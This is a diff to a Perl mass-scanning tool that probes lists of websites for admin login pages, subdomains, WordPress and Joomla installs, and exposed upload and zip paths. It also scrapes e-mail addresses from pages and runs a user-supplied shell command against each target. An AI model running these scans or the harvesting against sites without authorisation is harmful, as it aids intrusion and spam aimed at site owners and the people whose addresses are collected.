-	  print "[+] VULN:   ";
+	  print "    VULN:   ";
 	  print color RESET;
-	  
-	  my $pattern = 'password|username|email|Password|cPanel|admin';
-	  if ($html =~ m/$pattern/i){
-        if ( $response->is_success and $response->previous ) {
+      if ( $response->is_success and $response->previous ) {
+	    my $pattern = 'password|username|email|Password|cPanel|admin';
+	    my $no = '404|not fount|server error|error document';
+	    if (($html =~ m/$pattern/i) && ($html !~ m/$no/i)){
 	      print color 'green';
-          print '  ', $request->url, ' REDITECT TO: ', "\n";
+          print '', $request->url, " "; 
+	      print color RESET;
+		  print color 'red';
+		  print "REDIRECT TO: \n";
 	      print color RESET;
 	      print color 'green';
-		  print '              => ', $response->request->uri, "\n";
+		  print '            => ', $response->request->uri, "\n";
+	      print color RESET;
+	      print color 'bold yellow';
+	      print "    HTTP:   ";
+	      print color RESET;
+	      print color 'green';
+	      print "HTTP/1.1 $status\n";
 	      print color RESET;
 	    } else {
 	      print color 'green';
           print '  ',$response->request->uri, "\n";
+	      print color RESET;
+	      print color 'bold yellow';
+	      print "    HTTP:   ";
+	      print color RESET;
+	      print color 'green';
+	      print "HTTP/1.1 $status\n";
 	      print color RESET;
 	    }
 		$ul = $response->request->uri,;
@@ -1733,7 +2094,20 @@ sub madmin {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "admin_".getlist()) {unlink "admin_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "admin_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/admin_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
 
 ###################################################################		
@@ -1745,74 +2119,88 @@ sub msubdomain {
   if (!defined $mlevel) {
     targetlist();
   	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING SUBDOMAIN SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-	if (index($Target, 'http://www.') != -1) {
-	  $Target =~ s/http:\/\/www.//g;
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://www.') != -1) {
+	  $URL =~ s/http:\/\/www.//g;
 	}
-	if (index($Target, 'www.') != -1) {
-	  $Target =~ s/www.//g;
+	if (index($URL, 'www.') != -1) {
+	  $URL =~ s/www.//g;
 	}
-	
+	$URL =~ s/\/.*//s;
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] SUBDOMAIN SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$Target \n";
+	print "$printarget\n";
 	print color RESET;
-	
 	foreach $SUBDOMAIN(@SUBDOMAIN){
-      my $URL = $SUBDOMAIN.$Target;
-	  my $socket=IO::Socket::INET->new(
-      PeerAddr=>"$URL",
+      $URL1 = $SUBDOMAIN.$URL;
+	  $socket=IO::Socket::INET->new(
+      PeerAddr=>"$URL1",
       Proto=>'icmp',
       timeout=>1);
 	  
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "    EXPL:   ";
 	  print color RESET;
       print "$SUBDOMAIN \n";
 		
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "    INFO:   ";
 	  print color RESET;
-
-	  if ($socket ne "") { 
+	  
+	  if (defined $socket and $socket ne "") { 
 	    print color 'green';
-        print "http://$URL\n";
+        print "http://$URL1\n";
 	    print color RESET;
 		open (INFO, '>>scan.txt');
-        print INFO "$ul\n";
+        print INFO "http://$URL1\n";
         close (INFO);
 	  }else{
 	    print color 'red';
         print "Not a Subdomain! \n";
 	    print color RESET;
 	  }
-	  close $socket;
+	  close $socket if defined $socket;
     }
-	
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "subdomains_".getlist()) {unlink "subdomains_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "subdomains_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/subdomains_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
 
 
@@ -1824,51 +2212,60 @@ sub mwpsites {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING WORDPRESS SITES SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-    $Target =~ s/\/.*//s;
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
-
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] WORDPRESS SITES SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
-    print "$Target \n";
-	print color RESET;
-	  
-    print color 'bold yellow';
-	print "[!] CMS:    ";
-	print color RESET;
-	
-	$query = "/wp-login.php";
-    my $URL = $Target.$query;
-	$URL =~ s/ //g;
-    $request = HTTP::Request->new('GET', $URL);
+	print "$printarget\n";
+ 	$query = "/wp-login.php";
+    $URL1 = $URL.$query;
+	$URL1 =~ s/ //g;
+    $request = HTTP::Request->new('GET', $URL1);
     $response = $ua->request($request);
     my $html = $response->content;
-    if ($response->is_success) {
+	my $status = $response->code;
+    print color 'bold yellow';
+	print "    CMS:    ";
+	print color RESET;
+    if ($response->is_success and !$response->previous) {
 	  print color 'green';
       print "Wordpress! \n";
 	  print color RESET;
+	  print color 'bold yellow';
+	  print "    HTTP:   ";
+	  print color RESET;
+	  print color 'green';
+	  print "HTTP/1.1 $status\n";
+	  print color RESET;
 	  open (INFO, '>>scan.txt');
-      print INFO "$Target\n";
+      print INFO "$URL1\n";
       close (INFO);
 	}else{
 	  print color 'red';
@@ -1878,9 +2275,21 @@ sub mwpsites {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "wp_".getlist()) {unlink "wp_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "wp_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/wp_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
-
 ###################################################################		
 ## bgn mjoomsites
 sub mjoomsites {
@@ -1889,52 +2298,61 @@ sub mjoomsites {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
-  print "STARTING JOOMLA SITES SCAN ...\n";
+  print "STARTING JOOLMA SITES SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-    $Target =~ s/\/.*//s;
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
-
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] JOOMLA SITES SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$Target \n";
+	print "$printarget\n";
 	print color RESET;
-	  
-    print color 'bold yellow';
-	print "[!] CMS:    ";
-	print color RESET;
-	
-	$query = "/administrator/index.php";
-    my $URL = $Target.$query;
-	$URL =~ s/ //g;
-    $request = HTTP::Request->new('GET', $URL);
+ 	$query = "/administrator/index.php";
+    $URL1 = $URL.$query;
+	$URL1 =~ s/ //g;
+    $request = HTTP::Request->new('GET', $URL1);
     $response = $ua->request($request);
     my $html = $response->content;
-	my $pattern = 'mod-login-password|username|submit|passwd';
-	if ($html =~ m/$pattern/i){
+	my $status = $response->code;
+    print color 'bold yellow';
+	print "    CMS:   ";
+	print color RESET;
+    if ($response->is_success and !$response->previous) {
 	  print color 'green';
       print "Joomla! \n";
 	  print color RESET;
+	  print color 'bold yellow';
+	  print "    HTTP:   ";
+	  print color RESET;
+	  print color 'green';
+	  print "HTTP/1.1 $status\n";
+	  print color RESET;
 	  open (INFO, '>>scan.txt');
-      print INFO "$Target\n";
+      print INFO "$URL1\n";
       close (INFO);
 	}else{
 	  print color 'red';
@@ -1944,9 +2362,21 @@ sub mjoomsites {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "joom_".getlist()) {unlink "joom_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "joom_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/joom_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
-
 ###################################################################		
 ## bgn muploadsites
 sub muploadsites {
@@ -1956,56 +2386,65 @@ sub muploadsites {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
-  print "STARTING UPLOAD FILES SCAN ...\n";
+  print "STARTING UPLOAD SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-    $Target =~ s/\/.*//s;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
-	
-	print color 'bold magenta';
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+    print color 'bold magenta';
 	timer();
-	print "[$count/$lc] UPLOAD FILES SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$Target \n";
+	print "$printarget\n";
 	print color RESET;
-
 	foreach $UPLOAD(@UPLOAD){
-      my $URL = $Target.$UPLOAD;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $html = $response->content;
-	  
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "    EXPL:   ";
 	  print color RESET;
       print "$UPLOAD \n";
-		
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "    VULN:   ";
 	  print color RESET;
-
-	  if ( $response->is_success ) {
+      $URL1 = $URL.$UPLOAD;
+	  $URL1 =~ s/ //g;
+      $request = HTTP::Request->new('GET', $URL1);
+      my $response = $ua->request($request);
+      my $html = $response->content;
+	  my $status = $response->code;
+      if ($response->is_success and !$response->previous) {
 	    print color 'green';
-        print "$URL\n";
+        print "$URL1\n";
+	    print color RESET;
+	    print color 'bold yellow';
+	    print "    HTTP:   ";
+	    print color RESET;
+	    print color 'green';
+	    print "HTTP/1.1 $status\n";
 	    print color RESET;
 		open (INFO, '>>scan.txt');
-        print INFO "$Target\n";
+        print INFO "$URL\n";
         close (INFO);
 	  }else{
 	    print color 'red';
@@ -2016,9 +2455,22 @@ sub muploadsites {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "upload_".getlist()) {unlink "upload_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "upload_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/upload_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
-
+###################################################################		
 ###################################################################		
 ## bgn mzipsites
 sub mzipsites {
@@ -2028,56 +2480,65 @@ sub mzipsites {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
-  print "STARTING ZIP FILES SCAN ...\n";
+  print "STARTING ZIP SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-    $Target =~ s/\/.*//s;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
-	
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] ZIP FILES SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$Target \n";
+	print "$printarget\n";
 	print color RESET;
-
 	foreach $ZIP(@ZIP){
-      my $URL = $Target.$ZIP;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $html = $response->content;
-	  
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "    EXPL:   ";
 	  print color RESET;
       print "$ZIP \n";
-		
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "    VULN:   ";
 	  print color RESET;
-
-	  if ( $response->is_success ) {
+      $URL1 = $URL.$ZIP;
+	  $URL1 =~ s/ //g;
+      $request = HTTP::Request->new('GET', $URL1);
+      my $response = $ua->request($request);
+      my $html = $response->content;
+	  my $status = $response->code;
+      if ($response->is_success and !$response->previous) {
 	    print color 'green';
-        print "$URL\n";
+        print "$URL1\n";
+	    print color RESET;
+	    print color 'bold yellow';
+	    print "    HTTP:   ";
+	    print color RESET;
+	    print color 'green';
+	    print "HTTP/1.1 $status\n";
 	    print color RESET;
 		open (INFO, '>>scan.txt');
-        print INFO "$Target\n";
+        print INFO "$URL\n";
         close (INFO);
 	  }else{
 	    print color 'red';
@@ -2088,249 +2549,104 @@ sub mzipsites {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
-}
-###################################################################
-## bgn mhttpd
-sub mhttpd {
-  if (-e 'scan.txt'){ unlink 'scan.txt';}
-  testconection();
-  if (!defined $mlevel) {
-    targetlist();
-	scandetail();
-    forwait();
-  }
-  countsearchlist();
-  print color 'bold';
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  timer();
-  print "STARTING HTTPD SCAN ...\n";
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  print color RESET;
-  sleep(2);
-  $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
-    $count++;
-	chomp $Target;
-	my $printarget = $Target;
-	$Target =~ s/\/.*//s;
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	print color 'bold magenta';
-	timer();
-	print "[$count/$lc] HTTPD SCAN STARTING...\n";
-	print color RESET;
-	print color 'bold yellow';
-	print "[+] TARGET: ";
-	print color RESET;
-	print color 'yellow';
-    print "$printarget \n";
-	print color RESET;
-	
-	print color 'bold yellow';
-	print "[+] HTTPD:  ";
-	print color RESET;
-	
-    my $URL = $Target;
-    $useragent = LWP::UserAgent->new;
-    $resp = $useragent->head($Target);
-    if ($resp->is_success) {
-      print color 'green';
-      print "[!] ".$resp->headers_as_string;
-      print color RESET;
-    }else{
-      print color 'red';
-      print "\n    [!] Cannot reltreive headers!\n";
-      print color RESET;
-    }
-    print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  }
-  print color 'red';
-  timer();
-  print "SCAN FINISHED!\n";
-  print color RESET;
-}
-
-###################################################################		
-## bgn misup
-sub misup {
-  if (-e 'scan.txt'){ unlink 'scan.txt';}
-  testconection();
-  if (!defined $mlevel) {
-    targetlist();
-	scandetail();
-    forwait();
-  }
-  countsearchlist();
-  print color 'bold';
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  timer();
-  print "STARTING HTTP 200 OK SCAN ...\n";
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  print color RESET;
-  sleep(2);
-
-  my $browser = create_lwp_browser();
-  my ($working, $broken, $odd) = get_status_codes($browser);
-  sub get_status_codes {
-    my $browser = shift;
-    my $file='search.txt';
-	$count=0;
-    open (INFO,$file);
-    my @lines = <INFO>;
-    close(INFO);
-    foreach my $Target (@lines) {
-      chomp($Target);
-	  $count++;
-	  my $printarget = $Target;
-	  if (defined $mtarget) {
-	    $Target =~ s/\/.*//s;
-	  }
-      if ((defined $replace) && (defined $with)) {
-	    if ($Target =~ m/$replace/i) {
-		  $Target =~ s/$replace(.*)/$with/s;
-	    }
-      }
-	  if (defined $exploit) {
-	    $Target = $Target.$exploit;
-	    $Target =~ s/ //g;
-	  }
-	  print color 'bold magenta';
-	  timer();
-	  print "[$count/$lc VALIDATION SCAN STARTING...]\n";
-	  print color RESET;
-	  print color 'bold yellow';
-	  print "[+] TARGET: ";
-	  print color RESET;
-	  print color 'yellow';
-      print "$printarget \n";
-	  print color RESET;
-	  if (defined $exploit) {
-	    print color 'bold yellow';
-	    print "[+] EXPL:   ";
-	    print color RESET;
-	    print "$exploit\n";
-	  }
-	  print color 'bold yellow';
-	  print "[+] VALID:  ";
-	  print color RESET;
-
-      if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	  my $DEBUG = 1;
-      my $response = $browser->get($Target);
-      my $html = $response->content;
-      if ($DEBUG){
-	    if (($response->status_line =~ m/200 OK/i) &&  (!$response->previous) && ($html !~ m/not found/i) && ($html !~m/error/i)){
-	      print color 'green';
-          print("Valid! HTTP/1.1 ".$response->status_line."\n");
-		  print color RESET;
-	      open (INFO, '>>scan.txt');
-          print INFO "$Target\n";
-          close (INFO);
-		}else{
-	      print color 'red';
-		  if ($response->status_line =~ m/200 OK/i) {
-            print "Not Valid HTTP/ Undefined!\n";
-		  }else{
-            print("Not Valid HTTP/ ".$response->status_line."\n");
-		  }
-		  print color RESET; 
-		}
-      }
-      print "[ ]............................................................................ \n";
-    }
-  }
- 
-  sub create_lwp_browser {
-    my $browser = LWP::UserAgent->new;
-    $browser->env_proxy;
-    $browser->timeout(30);
-    $browser->agent('link_check.pl/1.0');
-    return $browser;
-  }
-  finmodule();
-}	  
-	  
-###################################################################
-## bgn mvalidation
-sub mvalidation {
-  if (-e 'scan.txt'){ unlink 'scan.txt';}
-  testconection();
-  if (!defined $mlevel) {
-    targetlist();
-	scandetail();
-    forwait();
-  }
-  countsearchlist();
-  print color 'bold';
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  timer();
-  print "STARTING VALIDATION SCAN ...\n";
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  print color RESET;
-  sleep(2);
-  $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
-    $count++;
-	chomp $Target;
-	my $printarget = $Target;
-	if (defined $mtarget) {
-	  $Target =~ s/\/.*//s;
-	}
-    if ((defined $replace) && (defined $with)) {
-	  if ($Target =~ m/$replace/i) {
-		$Target =~ s/$replace(.*)/$with/s;
-	  }
-    }
-	if (defined $exploit) {
-	  $Target = $Target.$exploit;
-	  $Target =~ s/ //g;
-    }
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	print color 'bold magenta';
-	timer();
-	print "[$count/$lc] VALIDATION SCAN STARTING...\n";
-	print color RESET;
-	print color 'bold yellow';
-	print "[+] TARGET: ";
-	print color RESET;
-	print color 'yellow';
-    print "$printarget \n";
-	print color RESET;
-    if (defined $exploit) {
-	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
-	  print color RESET;
-	  print "$exploit\n";
-	}
-	print color 'bold yellow';
-	print "[+] VALID:  ";
-	print color RESET;
-	
-    my $URL = $Target;
-    $request = HTTP::Request->new('GET', $URL);
-    $response = $ua->request($request);
-    my $html = $response->content;
-	if($html =~ m/$validation_text/i){
+  if ((!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "zip_".getlist()) {unlink "zip_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "zip_".getlist();
+	  fincontinuemodule();
 	  print color 'green';
-      print "Valid!\n";
-	  print color RESET;
-	  open (INFO, '>>scan.txt');
-      print INFO "$Target\n";
-      close (INFO);
-    }else{
-	  print color 'red';
-      print "Not Valid! \n";
+      print "[!] Results saved in $Bin/zip_".getlist()."!\n";
 	  print color RESET;
 	}
-    print "[ ] ----------------------------------------------------------------------- [ ]\n";
+	unlink 'scan.txt';
   }
-  finmodule();
 }
-
-###################################################################		
-###################################################################		
+################################################################
+################################################################
+## bgn mmails
+sub mmails {
+  if (-e 'scan.txt'){ unlink 'scan.txt';}
+  testconection();
+  if (!defined $mlevel) {
+    targetlist();
+	scandetail();
+  }
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  timer();
+  print "STARTING E-MAILS SCAN ...\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color RESET;
+  forwait();
+  $count=0;
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
+    $count++;
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) {$URL = "http://$URL"; };	
+	my $printarget = $URL;
+	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold yellow';
+	print "[!] TARGET:  ";
+	print color RESET;
+	print color 'yellow';
+    print "$URL\n";
+	print color RESET;
+	print color 'bold yellow';
+	print "    E-MAILS: \n";
+	print color RESET;
+    $request = HTTP::Request->new('GET', $URL);
+    my $response = $ua->request($request);
+    my $html = $response->content;
+	if ($html =~ /((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})/g) {
+	  my $mail=$1;
+	  if (defined $mail) {
+	    print color 'green';
+        print "      $mail\n";
+	    print color RESET;
+        open (INFO, '>>scan2.txt');
+        print INFO "$URL\n   $mail\n";
+        close (INFO);
+        open (INFO, '>>scan.txt');
+        print INFO "$mail\n";
+        close (INFO);
+	  }
+	}else{
+	  print color 'red';
+      print "      No Address E-mail found!\n";
+	  print color RESET;
+	}
+    print "[ ]............................................................................ \n";
+  }
+  close(TEXT);
+  if ((!defined $command) && (!defined $mports)) {
+	unlink 'scan2.txt';
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "mails_".getlist()) {unlink "mails_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan2.txt', "mails_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/mails_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+	unlink 'scan2.txt';
+  }
+}
+################################################################
+################################################################
 sub mmd5 {
   scandetail();
   print color 'bold';
@@ -2339,10 +2655,9 @@ sub mmd5 {
   print "STARTING MD5 GENERATOR...\n";
   print "[ ]............................................................................ \n";
   print color RESET;
-
   forwait();
   print color 'green';
-  print "[+] MD5 => ";
+  print "    MD5 => ";
   print Digest::MD5->md5_hex("$mmd5");
   print "\n";
   print color RESET;
@@ -2387,58 +2702,44 @@ sub mcommand {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING COMMAND EXTERN SUBPROCESS...\n";
   print "[ ]............................................................................ \n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-    if ((defined $replace) && (defined $with)) {
-	  if ($Target =~ m/$replace/i) {
-		$Target =~ s/$replace(.*)/$with/s;
-	  }
-    }
-	if (defined $exploit) {
-	  $Target = $Target.$exploit;
-	}
-	#if (defined $mtarget) {
-	if ($command =~ m/--TARGET/i) {
-	  $Target =~ s/\/.*//s;
-	}elsif ($command =~ m/--FULL_TARGET/i) {
-	  $Target =~ $Target;
-	}
-    if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-	
+	chomp $URL;
+	$URL=control($URL);
+    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] COMMAND SUBPROCESS STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$Target \n";
+    print "$URL \n";
 	
 	print color 'bold yellow';
-	print "[+] CMD:    ";
+	print "    CMD:    ";
 	print color RESET;
 	
 	$commandfull = $command;
 	if ($commandfull =~ m/--TARGET/i) {
-	  $commandfull =~ s/--TARGET/$Target/g;
+	  $commandfull =~ s/--TARGET/$URL/g;
 	}elsif ($commandfull =~ m/--FULL_TARGET/i) {
-	  $commandfull =~ s/--FULL_TARGET/$Target/g;
+	  $commandfull =~ s/--FULL_TARGET/$URL/g;
     }
-    #$commandfull = $command." ".$Target;
+    #$commandfull = $command." ".$URL;
 
 	print "$commandfull\n";
     system($commandfull); 
@@ -2450,43 +2751,79 @@ sub mcommand {
   print "SCAN FINISHED!\n";
   print color RESET;
 }
-
-
+###################################################################		
+###################################################################		
+sub resumeportscan {
+  if (defined $mports) {
+    print color 'bold yellow';
+    print "    INFO:   ";
+    print color RESET;
+    if (defined $mbasic) {
+	  print "Basic Scan ";
+    }
+    if (defined $mall) {
+      print "Complete Scan ";
+    }
+    if (defined $muser) {
+      print "Select Scan ";
+    }
+	my $muser=$muser;
+	my $mall=$mall;
+	if ((defined $mbasic and $mbasic eq "udp") || (defined $mall and $mall eq "udp") || (defined $muser and $muser eq "udp")) {
+	  print "UDP ";
+	}
+	if ((defined $mbasic and $mbasic eq "tcp") || (defined $mall and $mall eq "tcp") || (defined $muser and $muser eq "tcp")) {
+	  print "TCP ";
+	}
+    if (((defined $mbasic and $mbasic eq "udp+tcp") || (defined $mall and $mall eq "udp+tcp") || (defined $muser and $muser eq "udp+tcp")) || ((defined $mbasic and $mbasic eq "tcp+udp") || (defined $mall and $mall eq "tcp+udp") || (defined $muser and $muser eq "tcp+udp"))) {
+	  print "TCP + UDP";
+	}
+    if ((defined $mstart) && (defined $mend)) {
+      print "[$mstart To $mend] ";
+    }
+    print "\n";
+  }
+}
 ###################################################################		
 sub basic {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
